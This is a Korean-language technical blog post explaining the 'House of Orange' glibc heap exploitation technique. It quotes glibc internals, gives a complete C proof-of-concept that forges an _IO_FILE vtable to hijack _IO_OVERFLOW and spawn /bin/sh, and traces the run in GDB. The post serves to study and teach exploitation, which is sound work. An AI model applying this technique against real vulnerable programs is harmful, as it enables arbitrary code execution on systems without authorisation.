---
title: House Of Orange
date: 2019-01-15
---

top chunk size overwrite -> allocation request (request size > top chunk size) -> free chunk가 된 old top 에 fake struct overwrite + unsorted bin attack (target -> _IO_list_all)

top chunk의 size를 덮을 때 top chunk + size는 페이지 정렬이 되어야 함 그리고 prev_inuse bit 가 설정되어 있어야함

top chunk의 size보다 큰 값을 할당하면 sysmalloc이 호출되는데 이 때 _int_free()에 의해 top chunk -0x8 영역이 언솔빈에 들어가게 된다. 그리고 old top은 free chunk가 됨

그 후 free chunk가 된 old top 영역에 _IO_FILE_plus 와 _IO_wide_data 구조체 구조를 작성함

언솔빈 어택을 할 때는 old top의 bk영역에 _Io_lists_all -0x10의 값을 덮어 쓰고 그리고 free chunk의 size는 smallbin[4]에 넣기 위해 size를 변경해야 한다. (90 ~ 98)

```c
/*
   If not the first time through, we require old_size to be
   at least MINSIZE and to have prev_inuse set.
 */
 
assert ((old_top == initial_top (av) && old_size == 0) ||
        ((unsigned long) (old_size) >= MINSIZE &&
         prev_inuse (old_top) &&
         ((unsigned long) old_end & (pagesize - 1)) == 0));
 
/* Precondition: not enough current space to satisfy nb request */
assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

sysmalloc

```c
for (;; )
  {
    int iters = 0;
    while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
      {
        bck = victim->bk;
        if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
            || __builtin_expect (victim->size > av->system_mem, 0))
          malloc_printerr (check_action, "malloc(): memory corruption",
                           chunk2mem (victim), av);
        size = chunksize (victim);

```

이 코드에서 malloc curruption 이 나는데 _int_malloc() -> malloc_printerr() -> \_\_libc_message -> __FI_abort() -> _IO_flush_all_lockp() 이 순서로 호출이 된다. _IO_flush_all_lockp() 요 함수가 진행중에 변조한 vtable로 점프하게 끔 만들어야 한다.

```c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;
 
#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif
 
  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);
 
      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
       )
      && _IO_OVERFLOW (fp, EOF) == EOF)
    result = EOF;
 
      if (do_lock)
    _IO_funlockfile (fp);
      run_fp = NULL;
 
      if (last_stamp != _IO_list_all_stamp)
    {
      /* Something was added to the list.  Start all over again.  */
      fp = (_IO_FILE *) _IO_list_all;
      last_stamp = _IO_list_all_stamp;
    }
      else
    fp = fp->_chain;
    }
 
#ifdef _IO_MTSAFE_IO
  if (do_lock)
    _IO_lock_unlock (list_all_lock);
  __libc_cleanup_region_end (0);
#endif
 
  return result;
}
```

_IO_flush_all_lockp() 로직으로 주요한 몇 부분이 있다.

```c
 if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
```

이 부분의 조건을 맞춰줘야 _IO_OVERFLOW 함수를 호출 할 수 있다. 이 함수가 호출될 때 익스 트리거가 발생할 것이기 때문에 조건에 맞춰주어야 한다. 그리고 fp = fp->\_chain; 로직에 의해 fp가 smallbin[4]지점으로 변경된다. (이 부분 때문에 smallbin[4]에 free chunk를 넣어야 한다.)

_IO_flush_all_lockp() 에서 저 조건들을 맞춰주고 정상적으로 vtable로 점프한다면 익스가 성공한다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int winner ( char *ptr);
 
int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;
 
    p1 = malloc(0x400-16);
 
    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;
 
    p2 = malloc(0x1000);
    io_list_all = top[2] + 0x9a8;
    top[3] = io_list_all - 0x10;
 
    memcpy( ( char *) top, "/bin/sh\x00", 8);
 
    top[1] = 0x61;
    top[24] = 1;
    top[21] = 2;
    top[22] = 3;
    top[20] = (size_t) &top[18];
    top[15] = (size_t) &winner;
    top[27] = (size_t ) &top[12];
     
    malloc(10);
 
    return 0;
}
 
int winner(char *ptr)
{
    system(ptr);
    return 0;
}
```

간단하게 orange 코드를 보자

```c
gdb-peda$ x/32gx 0x602400
0x602400:	0x0068732f6e69622f	0x0000000000000061
0x602410:	0x00007ffff7dd1bc8	0x00007ffff7dd1bc8
0x602420:	0x0000000000000000	0x0000000000000000
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
0x602450:	0x0000000000000000	0x0000000000000000
0x602460:	0x0000000000000000	0x0000000000000000
0x602470:	0x0000000000000000	0x00000000004006e5
0x602480:	0x0000000000000000	0x0000000000000000
0x602490:	0x0000000000000000	0x0000000000000000
0x6024a0:	0x0000000000602490	0x0000000000000002
0x6024b0:	0x0000000000000003	0x0000000000000000
0x6024c0:	0x0000000000000001	0x0000000000000000
0x6024d0:	0x0000000000000000	0x0000000000602460
```

free chunk가 된 old top에 사용할 구조체들의 구조를 임의로 써준 모습이다.

```c
gdb-peda$ p _IO_list_all
$2 = (struct _IO_FILE_plus *) 0x7ffff7dd1b78 <main_arena+88>
```

_int_malloc()에 의해 이미 _IO_list_all 이 main_arena.top으로 덮어져 있고

```c
==================  Main Arena  ==================
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x624010 (size : 0x20ff0)
       last_remainder: 0x0 (size : 0x0)
            unsortbin: 0x602400 (size : 0x60)
(0x060)  smallbin[ 4]: 0x602400 (overlap chunk with 0x602400(freed) )
```

free chunk가 smallbin[4]에 들어가 있다. 

 _IO_flush_all_lockp 함수에 브레이크를 걸고 보면 명확하게 보인다.

```c
0x7ffff7a8920a <_IO_flush_all_lockp+490>:	mov    rbx,QWORD PTR [rbx+0x68]
```

이 인스트럭션을 수행하고 나면 fp가 free chunk로 바뀌게 된다. (fp = fp -> _chain;)

```c
gdb-peda$ x/gx $rbx
0x7ffff7dd1b78 <main_arena+88>:	0x0000000000624010
gdb-peda$ x/gx $rbx + 0x68
0x7ffff7dd1be0 <main_arena+192>:	0x0000000000602400
    
gdb-peda$ p fp
$4 = (struct _IO_FILE *) 0x602400
```

fp를 free chunk로 바꾸기 위해 smallbin[4]위치에 free chunk를 넣어주어야 하는 것

```c
=> 0x7ffff7a89165 <_IO_flush_all_lockp+325>:	mov    eax,DWORD PTR [rbx+0xc0]
   0x7ffff7a8916b <_IO_flush_all_lockp+331>:	test   eax,eax
   
gdb-peda$ x/gx $rbx+0xc0
0x6024c0:	0x0000000000000001
```

fp -> _mode > 0 

```c
=> 0x7ffff7a89173 <_IO_flush_all_lockp+339>:	mov    rax,QWORD PTR [rbx+0xa0]
   0x7ffff7a8917a <_IO_flush_all_lockp+346>:	mov    rcx,QWORD PTR [rax+0x18]
   0x7ffff7a8917e <_IO_flush_all_lockp+350>:	cmp    QWORD PTR [rax+0x20],rcx
   
gdb-peda$ x/gx $rbx+0xa0
0x6024a0:	0x0000000000602490
 gdb-peda$ x/gx 0x602490+0x18
0x6024a8:	0x0000000000000002
gdb-peda$ x/gx 0x602490+0x20
0x6024b0:	0x0000000000000003
```

fp -> _IO_write_ptr **>** fp -> _IO_write_base 

```c
=> 0x7ffff7a89184 <_IO_flush_all_lockp+356>:	mov    rax,QWORD PTR [rbx+0xd8]
   0x7ffff7a8918b <_IO_flush_all_lockp+363>:	mov    esi,0xffffffff
   0x7ffff7a89190 <_IO_flush_all_lockp+368>:	mov    rdi,rbx
   0x7ffff7a89193 <_IO_flush_all_lockp+371>:	call   QWORD PTR [rax+0x18]
   
gdb-peda$ x/gx $rbx+0xd8
0x6024d8:	0x0000000000602460
gdb-peda$ x/gx 0x602460 + 0x18
0x602478:	0x00000000004006e5
gdb-peda$ x/gx 0x00000000004006e5
0x4006e5 <winner>:	0x10ec8348e5894855
```

_IO_FILE_plus의 vtable 에서 _IO_OVERFLOW 함수를 호출하는 부분인데 트리거 해놓은 대로 winner를 call하는 걸 알 수 있다.

이렇게 call하게 되면 에러메세지와 함께 winner 함수가 호출된다.

```c
gdb-peda$ x/32gx 0x602400
0x602400:	0x0068732f6e69622f	0x0000000000000061
0x602410:	0x00007ffff7dd1bc8	0x00007ffff7dd1bc8
0x602420:	0x0000000000000000	0x0000000000000000
0x602430:	0x0000000000000000	0x0000000000000000
0x602440:	0x0000000000000000	0x0000000000000000
0x602450:	0x0000000000000000	0x0000000000000000
0x602460:	0x0000000000000000	0x0000000000000000
0x602470:	0x0000000000000000	0x00000000004006e5
0x602480:	0x0000000000000000	0x0000000000000000
0x602490:	0x0000000000000000	0x0000000000000000
0x6024a0:	0x0000000000602490	0x0000000000000002
0x6024b0:	0x0000000000000003	0x0000000000000000
0x6024c0:	0x0000000000000001	0x0000000000000000
0x6024d0:	0x0000000000000000	0x0000000000602460
```

1. _int_malloc() 에서 _IO_list_all 의 값을 main_arena.top으로 바꾸고 smallbin[4]의 값이 free chunk(0x602400)으로 바뀐다. 
2. 그 후 _int_malloc()에서 메모리 커럽션으로 인해 _IO_flush_all_lockp()를 호출하게 되는데 이 녀석은 _IO_list_all의 값 을 사용한다. 
3. _IO_list_all이 main_arena.top으로 변조되었기 때문에 그 주소를 사용하게 되고 내부 로직인 fp =  fp -> _chain에 의해 fp가 변경이 된다 (0x602400 == main_arena.top + 0x68) 즉, 여기가 fake struct _IO_FILE_plus의 시작 주소가 된다. 
4. fp -> _mode > 0 (0x6024c0 -> 1) 과 fp -> _IO_wide_data -> _IO_write_ptr **>** _IO_write_base 의 조건을 맞춰 준다. (0x6024b0 -> 3(\_IO_write_ptr) , 0x6024a8 -> 2(\_IO_write_base)) 
5. 그 다음 _IO_FILE_plus의 vtable을 이용해 _IO_OVERFLOW를 호출하게 되는데 0x602400 + 0xd8 == 0x6024d0 -> 0x602460(vtable), vtable + 0x18 == _IO_OVERFLOW이기 때문에 0x602460 + 0x18 -> winner가 call되면서 쉘을 획득하게 된다.

틀린 부분은 지적해 주세요!

#### 참고 자료 : https://www.lazenca.net/display/TEC/House+of+Orange

